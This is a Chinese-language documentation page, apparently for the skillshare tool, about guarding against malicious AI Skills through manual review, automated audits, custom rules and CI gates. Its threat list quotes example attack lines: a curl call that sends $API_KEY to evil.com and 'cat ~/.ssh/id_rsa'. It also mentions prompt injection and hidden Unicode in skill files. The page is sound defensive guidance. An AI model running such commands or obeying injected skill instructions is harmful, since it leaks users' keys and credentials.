---
sidebar_position: 10
---

# 保护你的 Skill

AI Skill 功能强大 — 它们指示 AI 助手读取文件、执行命令并与你的系统交互。本指南将帮助你围绕 Skill 的安装与维护建立安全工作流程。

完整的命令参考请参见 [`audit`](/docs/reference/commands/audit)。

## 风险所在：AI Skill 供应链

与运行在沙盒运行时中的传统软件包不同，AI Skill 通过 AI 直接解读并执行的**自然语言指令**运作。一个被篡改的 Skill 可以指示 AI：

- 窃取密钥（`curl https://evil.com?key=$API_KEY`）
- 读取凭据（`cat ~/.ssh/id_rsa`）
- 通过 prompt injection 绕过安全行为
- 使用零宽 Unicode 字符隐藏恶意意图

:::caution

单个恶意 Skill 就能访问你的 AI 助手所能触及的一切 — 环境变量、SSH 密钥、云端凭据、源代码。自动化扫描能捕捉已知模式，但**人工审查仍不可或缺**。

详细的威胁模型与检测规则，请参见 [Why Security Scanning Matters](/docs/understand/audit-engine#why-security-scanning-matters)。

:::

## 纵深防御

没有任何一层能捕捉所有风险。请结合人工审查、自动化扫描、自定义策略与 CI/CD 关卡：

| 层级 | 工具 | 作用 |
|-------|------|-------------|
| **审查** | 人工 | 安装前阅读 SKILL.md — 检查是否存在可疑命令 |
| **审计** | `skillshare audit` | 自动化模式检测（100+ 条内置规则，5 个严重级别，6 个分析器） |
| **自定义规则** | `audit-rules.yaml` | 组织特定模式（内部密钥、白名单） |
| **CI/CD** | 流水线关卡 | 阻止引入高风险 Skill 的 PR |

### 共享来源与执行边界 {#shared-source-and-execution-boundaries}

在 merge mode 中，每个受管理的 target skill 都链接到它的 source。symlink mode 则链接整个 source 目录。编辑共享文件时，所有链接到它的 targets 都会看到变更。这能让指令保持一致，也意味着不希望发生的修改可能影响多个工具。copy mode 会创建独立文件；用 `sync` 更新副本时，也可能分发同样不希望出现的内容。

将共享 skill 的变更放在经过审查的 Git commit，限制仓库的写入权限，并在更新或发现意外的本地修改后重新 audit。检查 diff，必要时通过备份或 Git 历史恢复。先前通过扫描，不代表后续修改已获认可，也不能保证每条指令都安全。

| 边界 | 控制的范围 | 不控制的范围 |
|----------|------------------|--------------------------|
| `audit` | 检测已知模式，按配置的发现严重级别拦截 install/update | AI 命令执行，或所有语义层面的 prompt injection 攻击 |
| `.skillignore` 与 target filters | 选择 merge/copy mode 中要发现或同步的 skills | 文件权限、对 `~/.ssh` 或 `~/.aws` 的访问，或 AI 工具的 shell 访问 |
| Git 审查与项目 lockfile | 审查共享变更，重现记录的远端 skill commit | 记录的指令是否安全，或模型如何遵循它们 |
| AI 工具的权限与沙盒 | 在工具支持的范围内，限制文件、shell 与网络访问 | Skill 目录策展或来源版本管理 |

在各 AI 工具中配置执行批准与沙盒限制，由该工具落实运行时的命令权限。私有 hub 通过主机的访问控制管理目录分发；只选用内部目录，不会阻止用户安装其他来源。

Audit 按发现的严重级别（`HIGH`、`CRITICAL` 等）拦截操作。0–100 的整体风险评分另行呈现，用来安排审查优先顺序，并不是拦截阈值。

### 供应链安全生命周期

安全检查点取决于 Skill 的安装方式（`--track` 还是常规安装）：

```mermaid
flowchart TD
    subgraph INSTALL ["阶段 1 — 安装"]
        I1["skillshare install &lt;source&gt;"] --> I2{"安装模式"}
        I2 -- "常规 Skill" --> I3{"审计扫描"}
        I3 -- "达到/超过阈值" --> I4["被阻止（除非 --force）✗"]
        I3 -- "通过 / --force" --> I5["记录到 .metadata.json<br/>（每个文件的 sha256）"]
        I5 --> I6["Skill 安装完成 ✓"]
        I2 -- "Tracked repo（--track）" --> I7["克隆仓库（含 .git）"]
        I7 --> I8{"审计整个仓库<br/>（相同阈值）"}
        I8 -- "达到/超过阈值" --> I9["被阻止 + 清理 ✗<br/>（若自动移除失败则需手动清理）"]
        I8 -- "通过 / --force" --> I10["Tracked repo 安装完成 ✓<br/>（无 file_hashes 元数据）"]
    end

    subgraph UPDATE ["阶段 2 — 更新"]
        U1["skillshare update _repo"] --> U2["git pull"]
        U2 --> U3{"更新后审计<br/>（阈值关卡）"}
        U3 -- "达到/超过阈值" --> U4["回滚<br/>（在 CI / 非 TTY 中自动执行）"]
        U3 -- "干净" --> U5["Tracked repo 更新完成 ✓"]

        R1["skillshare update &lt;skill&gt;"] --> R2["从 Source 重新安装"]
        R2 --> R3{"安装时审计<br/>（阈值关卡）"}
        R3 -- "达到/超过阈值" --> R4["被阻止 ✗"]
        R3 -- "通过" --> R5["刷新元数据哈希值"]
        R5 --> R6["常规 Skill 更新完成 ✓"]
    end

    subgraph INTEGRITY ["阶段 3 — 完整性"]
        A1["skillshare audit"] --> A2{"存在 file_hashes 元数据？"}
        A2 -- "否" --> A3["跳过哈希检查"]
        A2 -- "是" --> A4{"比对 SHA-256"}
        A4 -- "全部匹配" --> A8["干净 ✓"]
        A4 -- "不匹配" --> A5["content-tampered<br/>（MEDIUM）"]
        A4 -- "文件缺失" --> A6["content-missing<br/>（LOW）"]
        A4 -- "多出文件" --> A7["content-unexpected<br/>（LOW）"]
    end

    I10 --> U1
    I6 --> R1
    I6 --> A1
    I10 --> A1
    U5 --> A1
    R6 --> A1

    style I4 fill:#ef4444,color:#fff
    style I9 fill:#ef4444,color:#fff
    style U4 fill:#ef4444,color:#fff
    style R4 fill:#ef4444,color:#fff
    style I6 fill:#22c55e,color:#fff
    style I10 fill:#22c55e,color:#fff
    style U5 fill:#22c55e,color:#fff
    style R6 fill:#22c55e,color:#fff
    style A8 fill:#22c55e,color:#fff
    style A5 fill:#f59e0b,color:#000
    style A6 fill:#fbbf24,color:#000
    style A7 fill:#fbbf24,color:#000
    style I3 fill:#f59e0b,color:#000
    style I8 fill:#f59e0b,color:#000
    style U3 fill:#f59e0b,color:#000
    style R3 fill:#f59e0b,color:#000
    style A4 fill:#f59e0b,color:#000
```

**关键设计：**
- **常规 Skill 安装/更新** — 审计在接受前运行；成功的安装/更新会写入 `file_hashes` 元数据
- **Tracked repo 安装关卡** — 全新的 `--track` 安装会在接受前对整个克隆的仓库进行审计
- **Tracked repo 更新关卡** — `skillshare update` 在 `git pull` 之后进行审计；达到/超过阈值的发现会在非交互模式下自动触发回滚
- **完整性验证范围** — 只有存在 `file_hashes` 元数据时，才会运行 `content-*` 哈希检查

## 安全检查清单

:::tip 三阶段检查清单

**安装前：**
- [ ] 审查 Source 仓库（star 数、贡献者、近期活跃度）
- [ ] 阅读 SKILL.md — 留意 `curl`、`wget`、`eval`、凭据路径
- [ ] 先进行 dry-run：`skillshare install <source> --dry-run`

**安装后：**
- [ ] 运行 `skillshare audit` 并审查所有发现
- [ ] 即使 Skill「通过」也要检查 HIGH/MEDIUM 级别的发现（默认阈值为 CRITICAL）
- [ ] 定期重新审计 — 新规则可能会捕捉到此前未检测到的模式

**面向团队：**
- [ ] 在配置中设置 `audit.block_threshold: HIGH`
- [ ] 为组织特定的密钥模式创建自定义规则
- [ ] 为共享 Skill 仓库的 CI 流水线添加审计
- [ ] 安排定期扫描（见下方 [Periodic Scanning](#periodic-scanning)）

:::

## 组织策略

### 阻止阈值

默认阈值只会阻止 `CRITICAL` 级别的发现。对于团队而言，建议使用更严格的阈值：

```yaml
# ~/.config/skillshare/config.yaml
audit:
  block_threshold: HIGH  # 阻止 HIGH 和 CRITICAL 级别的发现
```

这能捕捉混淆处理、破坏性命令，以及隐藏内容注入 — 这些模式在 Skill 文件中几乎总是恶意的。

### 自定义规则

添加组织特定的检测模式，常见用例包括：

- 内部 API key 格式（`corp-api-key-*`、`internal-token-*`）
- 禁止访问的域名或服务
- 为受信任的 CI 自动化抑制误报

```yaml
# ~/.config/skillshare/audit-rules.yaml
rules:
  - id: internal-token-leak
    severity: HIGH
    pattern: internal-token
    message: "Internal API token pattern detected"
    regex: '(?i)\b(corp-api-key|internal-token)-[A-Za-z0-9]{10,}\b'

  - id: destructive-commands-2
    severity: MEDIUM
    pattern: destructive-commands
    message: "Sudo usage (downgraded for CI automation)"
    regex: '(?i)\bsudo\s+'
```

完整的自定义规则参考（合并语义、禁用规则、排除模式），请参见 [`audit rules` — Custom Rules](/docs/reference/commands/audit-rules#custom-rules)。

### 定期扫描 {#periodic-scanning}

规则会不断演进 — 安装时干净的 Skill 之后可能会匹配到新增的规则。安排定期扫描：

```bash
# crontab：每周扫描所有 Skill，记录结果
0 9 * * 1 skillshare audit --json >> /var/log/skillshare-audit.json 2>&1
```

## CI/CD 集成

### 基础流水线关卡

```bash
# 如果任何 Skill 存在 HIGH 及以上级别的发现，则使流水线失败
skillshare audit --threshold high
# 退出码：0 = 干净，1 = 发现问题
```

### 真实案例：Skill Hub PR 验证

[skillshare-hub](https://github.com/runkids/skillshare-hub) 社区仓库使用 `skillshare audit` 作为 PR 关卡。每个修改 Skill 的 PR 都会被自动扫描，审计结果会以 PR 评论形式发布：

```yaml
# .github/workflows/validate-pr.yml（简化版）
name: Validate PR
on:
  pull_request:
    paths: ['skills/**']

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: runkids/setup-skillshare@v1
        with:
          source: ./skills
          audit: true
          audit-threshold: high
```

完整工作流程（包括 PR 评论报告和构件上传），请参见 [validate-pr.yml 源码](https://github.com/runkids/skillshare-hub/blob/main/.github/workflows/validate-pr.yml)。

更多 CI/CD 模式（SARIF 上传、严格配置、手动设置），请参见 [CI/CD Skill Validation recipe](/docs/how-to/recipes/ci-cd-skill-validation)。

## 另请参阅

- [`audit`](/docs/reference/commands/audit) — CLI 命令参考
- [`audit rules`](/docs/reference/commands/audit-rules) — 规则管理与自定义
- [Audit Engine](/docs/understand/audit-engine) — 引擎工作原理（威胁模型、风险评分、分级）
- [Best Practices](/docs/how-to/daily-tasks/best-practices) — 命名、组织与安全卫生
- [Project Setup](/docs/how-to/sharing/project-setup) — 项目范围的 Skill 配置
